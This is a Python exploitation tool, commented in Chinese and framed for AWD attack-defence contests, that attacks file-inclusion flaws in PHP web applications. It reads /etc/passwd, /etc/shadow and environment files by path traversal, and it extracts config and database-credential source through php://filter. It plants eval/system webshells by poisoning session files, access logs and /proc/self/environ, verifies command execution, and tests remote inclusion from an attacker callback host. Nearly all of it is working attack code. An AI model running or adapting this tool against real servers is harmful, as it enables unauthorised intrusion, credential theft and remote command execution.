#!/usr/bin/env python3
"""
AWD 文件包含漏洞 (LFI/RFI) 利用工具
支持: 本地文件包含读取敏感文件, Session 包含, 日志包含, /proc 包含, 远程文件包含
"""

import requests
import re
import sys
import base64
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


class LFIExploiter:
    def __init__(self, url, method='GET', data=None, headers=None, cookies=None, timeout=10):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        if self.cookies:
            for k, v in self.cookies.items():
                self.session.cookies.set(k, v)
        self.base_content_length = 0
        self.results = []
        self.detected_params = []

    def _send(self, url, data=None):
        try:
            if self.method == 'GET':
                return self.session.get(url, timeout=self.timeout, allow_redirects=True)
            else:
                return self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True)
        except Exception:
            return None

    def _build_url(self, param_name, value):
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        params[param_name] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _build_data(self, param_name, value):
        data = dict(self.data)
        data[param_name] = value
        return data

    # ========= 1. 参数发现 =========
    def detect_lfi_params(self):
        """检测可能存在 LFI 的参数"""
        suspicious_keywords = [
            'file', 'path', 'doc', 'page', 'include', 'require', 'read',
            'load', 'lang', 'template', 'content', 'module', 'action',
            'cat', 'pic', 'img', 'filename', 'name', 'dir', 'folder',
            'template', 'tpl', 'php_path', 'pg', 'pdf', 'inc', 'view',
        ]

        parsed = urlparse(self.url)
        params = list(parse_qs(parsed.query).keys()) + list(self.data.keys())

        # 检查 URL 中是否已有可疑参数
        for param in params:
            for keyword in suspicious_keywords:
                if keyword.lower() in param.lower():
                    print(f"  [*] 参数 '{param}' 可能存在 LFI (关键词: {keyword})")
                    self.detected_params.append(param)

        # 主动猜测参数
        if not self.detected_params:
            print("[*] 猜测可能的 LFI 参数...")
            for keyword in suspicious_keywords:
                test_param = keyword
                test_value = '/etc/passwd'
                if self.method == 'GET':
                    test_url = self._build_url(test_param, test_value)
                    resp = self._send(test_url)
                else:
                    test_data = self._build_data(test_param, test_value)
                    resp = self._send(self.url, test_data)

                if resp and ('root:' in resp.text or 'Warning' in resp.text):
                    self.detected_params.append(test_param)
                    print(f"  [!!!] 发现 LFI 参数: {test_param}")
                    break

        return self.detected_params

    # ========= 2. 基础 LFI 测试 =========
    def test_basic_lfi(self):
        """测试基础本地文件包含"""
        lfi_payloads = [
            # 直接路径
            '/etc/passwd',
            '/etc/passwd%00',
            '/etc/shadow',
            '/proc/self/environ',
            '/proc/version',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            '/var/log/apache/access.log',
            # 相对路径
            '../../../etc/passwd',
            '../../../etc/passwd%00',
            '....//....//....//etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd',
            # 过滤器
            'php://filter/read=convert.base64-encode/resource=config',
            'php://filter/read=convert.base64-encode/resource=index',
            'php://filter/read=convert.base64-encode/resource=config.php',
            # Session
            '/tmp/sess_' + 's3cur3s3ss10n',  # 占位
            # 日志
            '/var/log/apache2/access.log',
            # 环境变量
            '/proc/self/environ',
        ]

        print("\n[*] 测试基础 LFI")
        for param in self.detected_params:
            for payload in lfi_payloads:
                if self.method == 'GET':
                    test_url = self._build_url(param, payload)
                    resp = self._send(test_url)
                else:
                    test_data = self._build_data(param, payload)
                    resp = self._send(self.url, test_data)

                if resp is None:
                    continue

                # 检查响应
                if 'root:' in resp.text:
                    print(f"  [!!!] LFI 成功读取 {payload}")
                    print(f"      参数: {param}")
                    self.results.append({
                        'type': 'lfi',
                        'param': param,
                        'payload': payload,
                        'data_preview': resp.text[:500],
                        'severity': 'critical'
                    })
                    return True

                if re.search(r'PHP_VERSION|PHP_OS|php_uname', resp.text):
                    print(f"  [!!!] LFI 成功读取 PHP 信息 (过滤器)")
                    self.results.append({
                        'type': 'lfi_filter',
                        'param': param,
                        'payload': payload,
                        'severity': 'high'
                    })

        print("  [-] 基础 LFI 测试失败")
        return False

    # ========= 3. PHP Filter 读取源码 =========
    def read_source_via_filter(self):
        """通过 php://filter 读取任意 PHP 文件源码"""
        print("\n[*] PHP Filter 源码读取")

        php_files_to_read = [
            'config',
            'config.php',
            'database',
            'database.php',
            'db',
            'db.php',
            'conn',
            'conn.php',
            'common',
            'common.php',
            'function',
            'function.php',
            'admin/config',
            'admin/config.php',
            'include/config',
            'include/config.php',
            'web.config',
            'wp-config',
            'wp-config.php',
        ]

        for param in self.detected_params:
            for filename in php_files_to_read:
                payload = f'php://filter/read=convert.base64-encode/resource={filename}'

                if self.method == 'GET':
                    test_url = self._build_url(param, payload)
                    resp = self._send(test_url)
                else:
                    test_data = self._build_data(param, payload)
                    resp = self._send(self.url, test_data)

                if resp is None:
                    continue

                # 检查是否返回 base64 编码内容
                b64_pattern = re.compile(r'[A-Za-z0-9+/]{20,}={0,3}')
                matches = b64_pattern.findall(resp.text)
                for match in matches:
                    try:
                        decoded = base64.b64decode(match)
                        # 检查是否包含 PHP 源码特征
                        if b'<?php' in decoded or b'mysql' in decoded.lower() or b'config' in decoded.lower() or b'password' in decoded.lower():
                            print(f"  [!!!] 成功读取: {filename}")
                            print(f"      源码片段: {decoded[:300].decode(errors='ignore')}")
                            self.results.append({
                                'type': 'source_disclosure',
                                'filename': filename,
                                'source_preview': decoded[:500].decode(errors='ignore'),
                                'severity': 'critical'
                            })
                    except Exception:
                        pass

    # ========= 4. Session 文件包含 =========
    def exploit_session_inclusion(self):
        """通过 Session 文件包含写入 Webshell"""
        print("\n[*] Session 文件包含攻击")

        # 步骤 1: 发送 PHP 代码到 Session 存储
        session_payloads = [
            '<?php system($_GET["cmd"]);?>',
            '<?php eval($_POST["cmd"]);?>',
            '<?php @eval($_REQUEST["cmd"]);?>',
        ]

        for payload in session_payloads:
            # 先请求包含 payload 的 URL (会存入 Session)
            test_url = self.url + f'?PHPSESSID=AWDSESSION&cmd={payload}'
            session_resp = self._send(test_url)

            if session_resp is None:
                continue

            # 然后通过 LFI 包含 Session 文件
            session_path_payloads = [
                '/tmp/sess_AWDSESSION',
                '/tmp/sess_AWDSESSION%00',
                '/var/lib/php/sessions/sess_AWDSESSION',
                '/var/lib/php/session/sess_AWDSESSION',
                '../../../tmp/sess_AWDSESSION',
                '../../../var/lib/php/sessions/sess_AWDSESSION',
            ]

            for param in self.detected_params:
                for sess_path in session_path_payloads:
                    if self.method == 'GET':
                        test_url = self._build_url(param, sess_path)
                        resp = self._send(test_url)
                    else:
                        test_data = self._build_data(param, sess_path)
                        resp = self._send(self.url, test_data)

                    if resp and 'Warning' not in resp.text:
                        # 尝试执行命令
                        if self.method == 'GET':
                            verify_url = test_url + '&cmd=echo"SHELL_OK";system("id");'
                            verify_resp = self._send(verify_url)
                        else:
                            verify_data = self._build_data(param, sess_path)
                            verify_data['cmd'] = 'echo"SHELL_OK";system("id");'
                            verify_resp = self._send(self.url, verify_data)

                        if verify_resp and ('SHELL_OK' in verify_resp.text or 'uid=' in verify_resp.text):
                            print(f"  [!!!] Session 文件包含成功!")
                            print(f"      Webshell URL: {test_url}")
                            self.results.append({
                                'type': 'session_inclusion',
                                'shell_url': test_url,
                                'severity': 'critical'
                            })
                            return True

        print("  [-] Session 文件包含失败")
        return False

    # ========= 5. 日志文件包含 =========
    def exploit_log_inclusion(self):
        """通过日志文件包含写入 Webshell"""
        print("\n[*] 日志文件包含攻击")

        log_paths = [
            '/var/log/apache2/access.log',
            '/var/log/apache/access.log',
            '/var/log/nginx/access.log',
            '/var/log/apache2/error.log',
            '/var/log/messages',
            '/var/log/syslog',
        ]

        # 注入 PHP 代码到日志 (通过 User-Agent)
        shell_code = '<?php @eval($_POST["cmd"]);?>'

        for log_path in log_paths:
            # 先写日志
            headers = dict(self.headers)
            headers['User-Agent'] = shell_code

            log_write_url = self.url
            try:
                self.session.get(log_write_url, headers=headers, timeout=self.timeout)
            except Exception:
                pass

            # 通过 LFI 包含日志
            for param in self.detected_params:
                if self.method == 'GET':
                    test_url = self._build_url(param, log_path)
                    resp = self._send(test_url)
                else:
                    test_data = self._build_data(param, log_path)
                    resp = self._send(self.url, test_data)

                if resp and shell_code in resp.text:
                    print(f"  [!!!] 日志包含成功!")
                    print(f"      日志路径: {log_path}")

                    # 验证 Webshell
                    verify_resp = None
                    if self.method == 'GET':
                        verify_url = test_url + '&cmd=echo"SHELL_OK";system("id");'
                        verify_resp = self._send(verify_url)
                    else:
                        verify_data = self._build_data(param, log_path)
                        verify_data['cmd'] = 'echo"SHELL_OK";system("id");'
                        verify_resp = self._send(self.url, verify_data)

                    if verify_resp and ('SHELL_OK' in verify_resp.text or 'uid=' in verify_resp.text):
                        self.results.append({
                            'type': 'log_inclusion',
                            'log_path': log_path,
                            'shell_url': test_url,
                            'severity': 'critical'
                        })
                        return True

        print("  [-] 日志文件包含失败")
        return False

    # ========= 6. 环境变量包含 =========
    def exploit_environ_inclusion(self):
        """通过 /proc/self/environ 包含"""
        print("\n[*] 环境变量包含攻击")

        environ_payloads = [
            '/proc/self/environ',
            '/proc/self/environ%00',
            '../../../proc/self/environ',
        ]

        shell_code = '<?php system($_GET["cmd"]);?>'

        for environ_path in environ_payloads:
            # 注入 PHP 代码到 User-Agent (CGI 模式下会出现在 environ)
            headers = dict(self.headers)
            headers['User-Agent'] = shell_code

            # 先触发一次让 UA 被记录
            try:
                self.session.get(self.url, headers=headers, timeout=self.timeout)
            except Exception:
                pass

            # 通过 LFI 包含 environ
            for param in self.detected_params:
                if self.method == 'GET':
                    test_url = self._build_url(param, environ_path)
                    resp = self._send(test_url)
                else:
                    test_data = self._build_data(param, environ_path)
                    resp = self._send(self.url, test_data)

                if resp and shell_code in resp.text:
                    print(f"  [!!!] environ 包含成功!")
                    self.results.append({
                        'type': 'environ_inclusion',
                        'severity': 'high'
                    })
                    return True

        print("  [-] environ 包含失败")
        return False

    # ========= 7. RFI 远程文件包含 =========
    def test_rfi(self, callback_url=None):
        """测试远程文件包含"""
        print("\n[*] 远程文件包含 (RFI) 测试")

        rfi_payloads = []
        if callback_url:
            # 构造远程 payload
            rfi_payloads = [
                f'{callback_url}/shell.txt?',
                f'{callback_url}/shell.txt%23',
                f'{callback_url}/shell.txt%00',
                f'{callback_url}/shell.jpg?',
            ]
        else:
            # 使用 http://localhost 测试 RFI 可用性
            rfi_payloads = [
                'http://localhost/',
                'http://127.0.0.1/',
                'http://127.0.0.1:80/',
                'http://0.0.0.0/',
            ]

        for param in self.detected_params:
            for payload in rfi_payloads:
                if self.method == 'GET':
                    test_url = self._build_url(param, payload)
                    resp = self._send(test_url)
                else:
                    test_data = self._build_data(param, payload)
                    resp = self._send(self.url, test_data)

                if resp and resp.status_code == 200 and len(resp.text) > 0:
                    # RFI 可能存在 (远程请求被执行)
                    if 'Warning' not in resp.text and 'error' not in resp.text.lower():
                        print(f"  [!!!] RFI 可能存在: {param}={payload}")
                        self.results.append({
                            'type': 'rfi',
                            'param': param,
                            'payload': payload,
                            'severity': 'high'
                        })
                        return True

        print("  [-] RFI 测试未发现")
        return False

    # ========= 完整利用流程 =========
    def full_exploit(self, callback_url=None):
        """执行完整 LFI/RFI 利用流程"""
        print("="*60)
        print("  AWD 文件包含漏洞利用工具")
        print("="*60)
        print(f"目标: {self.url}")

        self.detect_lfi_params()

        if not self.detected_params:
            print("\n[!] 未发现可疑 LFI 参数, 继续测试...")
            # 使用所有参数尝试
            parsed = urlparse(self.url)
            all_params = list(parse_qs(parsed.query).keys()) + list(self.data.keys())
            if not all_params:
                print("[-] 无可用参数, 退出")
                return self.results
            self.detected_params = all_params

        self.test_basic_lfi()
        self.read_source_via_filter()
        self.exploit_session_inclusion()
        self.exploit_log_inclusion()
        self.exploit_environ_inclusion()
        self.test_rfi(callback_url)

        # 结果汇总
        print("\n" + "="*60)
        print("  利用结果汇总")
        print("="*60)
        if self.results:
            for r in self.results:
                print(f"  [{r.get('severity','info')}] {r.get('type','')}")
                if 'param' in r:
                    print(f"    参数: {r['param']}")
                if 'payload' in r:
                    print(f"    Payload: {r['payload'][:60]}")
        else:
            print("  未发现文件包含漏洞")

        return self.results


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法:")
        print("  python3 file_inclusion.py <url>")
        print("  python3 file_inclusion.py <url> --post 'param1=val1'")
        print("  python3 file_inclusion.py <url> --cookie 'session=xxx'")
        print("  python3 file_inclusion.py <url> --callback <回调URL>")
        sys.exit(1)

    url = sys.argv[1]
    method = 'GET'
    data = {}
    cookies = {}
    callback_url = None

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--post' and i + 1 < len(sys.argv):
            method = 'POST'
            for pair in sys.argv[i+1].split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    data[k] = v
            i += 2
        elif sys.argv[i] == '--cookie' and i + 1 < len(sys.argv):
            for pair in sys.argv[i+1].split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    cookies[k.strip()] = v.strip()
            i += 2
        elif sys.argv[i] == '--callback' and i + 1 < len(sys.argv):
            callback_url = sys.argv[i+1]
            i += 2
        else:
            i += 1

    exploiter = LFIExploiter(url, method=method, data=data, cookies=cookies)
    exploiter.full_exploit(callback_url=callback_url)
